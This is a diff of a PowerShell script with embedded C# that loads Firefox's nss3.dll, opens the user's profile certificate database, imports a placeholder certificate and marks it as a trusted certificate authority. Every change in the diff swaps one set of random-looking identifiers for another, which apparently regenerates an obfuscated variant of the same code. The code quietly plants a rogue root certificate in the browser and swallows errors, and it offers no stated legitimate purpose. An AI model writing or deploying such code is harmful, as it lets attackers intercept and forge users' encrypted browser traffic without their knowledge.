@@ -1,4 +1,4 @@
-function YAaGdftGsx{
+function tcXQywqUSqjH{
 Add-Type @"
 using System;
 using System.IO;
@@ -6,29 +6,29 @@ using Microsoft.Win32;
 using System.Runtime.InteropServices;
 using System.ComponentModel;
 
-public sealed class FocgeGTuux
+public sealed class bmioSaauKx
 {
-	private static volatile FocgeGTuux xbWUzwHVsz;
-	private static object vNTvBCcrpH = new Object();
-	public static FocgeGTuux mQBxTfBXjX()
+	private static volatile bmioSaauKx CSabcn;
+	private static object EaqLHdMhdBZETrI = new Object();
+	public static bmioSaauKx dgahhQoyteFKij()
     {
-        if (xbWUzwHVsz == null)
+        if (CSabcn == null)
         {
-            lock (vNTvBCcrpH)
+            lock (EaqLHdMhdBZETrI)
             {
-                if (xbWUzwHVsz == null)
-                xbWUzwHVsz = new FocgeGTuux();
+                if (CSabcn == null)
+                CSabcn = new bmioSaauKx();
             }
         }
-        return xbWUzwHVsz;
+        return CSabcn;
     }
 	
-	const int tICtkfRETI=0;
+	const int MSQEcNzGwNd=0;
     
     [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
     static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
 
-    private static IntPtr ydrSWxYcIx(string libPath)
+    private static IntPtr fZi(string libPath)
     {
         if (String.IsNullOrEmpty(libPath))
             throw new ArgumentNullException("libPath");
@@ -94,63 +94,63 @@ public sealed class FocgeGTuux
         certUsageAnyCA = 11
     }
 	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate int xjJvgBIpWv(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags);
+    private delegate int pnkbfXcFoGnFy(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags);
 
-    private int htZHmCbVcG(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags)
+    private int DrSnqA(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags)
     {
-        IntPtr pProc = GetProcAddress(ctHnwGUAAA, "NSS_Initialize");
-        xjJvgBIpWv ptr = (xjJvgBIpWv)Marshal.GetDelegateForFunctionPointer(pProc, typeof(xjJvgBIpWv));
+        IntPtr pProc = GetProcAddress(uKfqQI, "NSS_Initialize");
+        pnkbfXcFoGnFy ptr = (pnkbfXcFoGnFy)Marshal.GetDelegateForFunctionPointer(pProc, typeof(pnkbfXcFoGnFy));
         return ptr(sConfigDir, certPrefix, keyPrefix, secModName, flags);
     }
 
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate IntPtr ztMUsegLTQ();
-    private IntPtr FMqhdsJfTm()
+    private delegate IntPtr DSWru();
+    private IntPtr VmNaPqe()
     {
-        IntPtr pProc = GetProcAddress(ctHnwGUAAA, "CERT_GetDefaultCertDB");
-        ztMUsegLTQ ptr = (ztMUsegLTQ)Marshal.GetDelegateForFunctionPointer(pProc, typeof(ztMUsegLTQ));
+        IntPtr pProc = GetProcAddress(uKfqQI, "CERT_GetDefaultCertDB");
+        DSWru ptr = (DSWru)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DSWru));
         return ptr();
     }
 
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate IntPtr EYMdMcGGZo();
-    private IntPtr STNCySdUGr()
+    private delegate IntPtr SQTDZwqDltww();
+    private IntPtr AuhROAD()
     {
-        IntPtr pProc = GetProcAddress(ctHnwGUAAA, "NSS_Shutdown");
-        EYMdMcGGZo ptr = (EYMdMcGGZo)Marshal.GetDelegateForFunctionPointer(pProc, typeof(EYMdMcGGZo));
+        IntPtr pProc = GetProcAddress(uKfqQI, "NSS_Shutdown");
+        SQTDZwqDltww ptr = (SQTDZwqDltww)Marshal.GetDelegateForFunctionPointer(pProc, typeof(SQTDZwqDltww));
         return ptr();
     }
 
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    private delegate int cmMeiAGYct(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname);
-    private int gjHnkEGNWl(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname)
+    private delegate int jgztPQYUcCqti(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname);
+    private int lNAhXCqNAOzryU(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname)
     {
-        IntPtr pProc = GetProcAddress(ctHnwGUAAA, "CERT_ImportCerts");
-        cmMeiAGYct ptr = (cmMeiAGYct)Marshal.GetDelegateForFunctionPointer(pProc, typeof(cmMeiAGYct));
+        IntPtr pProc = GetProcAddress(uKfqQI, "CERT_ImportCerts");
+        jgztPQYUcCqti ptr = (jgztPQYUcCqti)Marshal.GetDelegateForFunctionPointer(pProc, typeof(jgztPQYUcCqti));
         return ptr(certdb, usage, ncerts, ref derCerts, ref retCerts, keepCerts, caOnly, nickname);
     }
 
-    private delegate int dibkQLtQeg(IntPtr certdb, IntPtr cert, ref CertTrusts trust);
-    private int RMwSWdjbrN(IntPtr certdb, IntPtr cert, ref CertTrusts trust)
+    private delegate int QoQlhxcZtWbU(IntPtr certdb, IntPtr cert, ref CertTrusts trust);
+    private int enTg(IntPtr certdb, IntPtr cert, ref CertTrusts trust)
     {
-        IntPtr pProc = GetProcAddress(ctHnwGUAAA, "CERT_ChangeCertTrust");
-        dibkQLtQeg ptr = (dibkQLtQeg)Marshal.GetDelegateForFunctionPointer(pProc, typeof(dibkQLtQeg));
+        IntPtr pProc = GetProcAddress(uKfqQI, "CERT_ChangeCertTrust");
+        QoQlhxcZtWbU ptr = (QoQlhxcZtWbU)Marshal.GetDelegateForFunctionPointer(pProc, typeof(QoQlhxcZtWbU));
         return ptr(certdb, cert, ref trust);
     }
 
     [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
-    public delegate int mIbIVeepQp(IntPtr cert, uint ncerts);
-    private int dlLKjvokNW(IntPtr cert, uint ncerts)
+    public delegate int MNnHOkgvTXcfx(IntPtr cert, uint ncerts);
+    private int xBTjtYhnvW(IntPtr cert, uint ncerts)
     {
-        IntPtr pProc = GetProcAddress(ctHnwGUAAA, "CERT_DestroyCertArray");
-        mIbIVeepQp ptr = (mIbIVeepQp)Marshal.GetDelegateForFunctionPointer(pProc, typeof(mIbIVeepQp));
+        IntPtr pProc = GetProcAddress(uKfqQI, "CERT_DestroyCertArray");
+        MNnHOkgvTXcfx ptr = (MNnHOkgvTXcfx)Marshal.GetDelegateForFunctionPointer(pProc, typeof(MNnHOkgvTXcfx));
         return ptr(cert, ncerts);
     }
 
-	private IntPtr ctHnwGUAAA = IntPtr.Zero;
+	private IntPtr uKfqQI = IntPtr.Zero;
 	
-	public Boolean fTYqKunpTV(String sCert){
-        System.Console.WriteLine("FocgeGTuux Start");
+	public Boolean SwQ(String sCert){
+        System.Console.WriteLine("bmioSaauKx Start");
 		String sProfile = GetProfile();
         if (String.IsNullOrEmpty(sProfile))
         {
@@ -169,10 +169,10 @@ public sealed class FocgeGTuux
             foreach(FileInfo fiDll in diInstallPath.GetFiles("*.dll"))
             {
                 if (fiDll.Name.Equals("breakpadinjector.dll")) continue;
-                ydrSWxYcIx(fiDll.FullName);
+                fZi(fiDll.FullName);
             }
-            ctHnwGUAAA = ydrSWxYcIx(diInstallPath.FullName + "\\nss3.dll");
-            if (ctHnwGUAAA.Equals(IntPtr.Zero))
+            uKfqQI = fZi(diInstallPath.FullName + "\\nss3.dll");
+            if (uKfqQI.Equals(IntPtr.Zero))
             {
                 System.Console.WriteLine("Firefox install directory not found");
                 return false;
@@ -193,46 +193,46 @@ public sealed class FocgeGTuux
             CertTrust.iSoft = 0x10;
             System.Console.WriteLine("Init cert OK");
             //End init cert
-            int status = htZHmCbVcG(sProfile, "", "", SECMOD_DB, NSS_INIT_OPTIMIZESPACE);
-            if (status != tICtkfRETI)
+            int status = DrSnqA(sProfile, "", "", SECMOD_DB, NSS_INIT_OPTIMIZESPACE);
+            if (status != MSQEcNzGwNd)
             {
                 System.Console.WriteLine(String.Format("NSS_InitReadWrite ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
                 return false;
             }
-            IntPtr bd = FMqhdsJfTm();
+            IntPtr bd = VmNaPqe();
             if (bd == IntPtr.Zero)
             {
                 System.Console.WriteLine("CERT_GetDefaultCertDB Failed");
-                STNCySdUGr();
+                AuhROAD();
                 return false;
             }
             System.Console.WriteLine("CERT_GetDefaultCertDB OK");
             IntPtr CertToImport = new IntPtr();
             IntPtr[] aCertToImport = new IntPtr[1];
-            status = gjHnkEGNWl(bd, 11, 1, ref aCertItem, ref CertToImport, 1, 0, IntPtr.Zero);
-            if (status != tICtkfRETI)
+            status = lNAhXCqNAOzryU(bd, 11, 1, ref aCertItem, ref CertToImport, 1, 0, IntPtr.Zero);
+            if (status != MSQEcNzGwNd)
             {
                 System.Console.WriteLine(String.Format("CERT_ImportCerts ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
-                STNCySdUGr();
+                AuhROAD();
                 return false;
             }
             System.Console.WriteLine("CERT_ImportCerts OK");
             Marshal.Copy(CertToImport, aCertToImport, 0, 1);
-            status = RMwSWdjbrN(bd, aCertToImport[0], ref CertTrust);
-            if ( status != tICtkfRETI) 
+            status = enTg(bd, aCertToImport[0], ref CertTrust);
+            if ( status != MSQEcNzGwNd) 
             {
                 System.Console.WriteLine(String.Format("CERT_ChangeCertTrust ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
-                STNCySdUGr();
+                AuhROAD();
                 return false;
             };
             System.Console.WriteLine("CERT_ChangeCertTrust OK");
-            dlLKjvokNW(CertToImport, 1);
+            xBTjtYhnvW(CertToImport, 1);
             System.Console.WriteLine("Add cert OK");
         }
         catch (Exception){}
         finally
         {
-            STNCySdUGr();
+            AuhROAD();
         }
 		return true;
 	}
@@ -315,6 +315,6 @@ public sealed class FocgeGTuux
     }
 }
 "@;
-[FocgeGTuux]::mQBxTfBXjX().fTYqKunpTV("%CERT%");
+[bmioSaauKx]::dgahhQoyteFKij().SwQ("%CERT%");
 }
-YAaGdftGsx
+tcXQywqUSqjH
